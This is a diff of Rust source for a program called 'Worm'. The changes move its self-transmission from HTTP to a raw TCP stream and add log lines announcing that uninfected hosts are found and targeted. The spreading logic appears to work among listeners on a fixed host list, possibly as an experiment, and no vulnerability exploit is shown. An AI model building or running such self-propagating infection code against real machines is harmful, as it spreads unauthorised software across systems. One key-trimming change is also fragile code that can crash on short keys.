@@ -11,7 +11,7 @@ use nix::unistd::{execv, setsid, fork, gethostname, ForkResult};
 
 use std::io::{BufReader, BufRead, Read};
 use std::fs::File;
-use std::net::{TcpListener};
+use std::net::{TcpListener, TcpStream};
 use std::{thread, time};
 use std::collections::hash_map::DefaultHasher;
 use std::collections::HashMap;
@@ -60,7 +60,7 @@ impl Worm {
             .json().expect("Error parsing JSON");
 
         for (k, v) in map.iter() {
-            self.observation_data.insert(k.to_string(), v.to_string());
+            self.observation_data.insert(k[..k.len()-5].to_string(), v.to_string());
         }
     }
 
@@ -95,10 +95,8 @@ impl Worm {
         let client = reqwest::Client::new();
         let port = self.calculate_port(host.as_bytes());
 
-        let res = client.post(&format!("http://{}:{}", host, port))
-            .json(&self)
-            .send().expect("Error sending message");
-        println!("Sent data to host and got response: {:?}", res);
+        let stream = TcpStream::connect(&format!("{}:{}", host, port)).expect("Could not bind to socket");
+        let res = serde_json::to_writer(stream, &self);
     }
 
     pub fn send_to_host(&self, host: &str) {
@@ -108,7 +106,9 @@ impl Worm {
 
     pub fn send_to_random_host(&self) {
         for host in self.hosts_to_ovserve.iter() {
+            println!("Checking if {:?} has been infected", host);
             if self.observation_data.contains_key(host) == false {
+                println!("{:?} has not been infected - lets go!", host);
                 self.send_to_host(&host);
                 return
             }
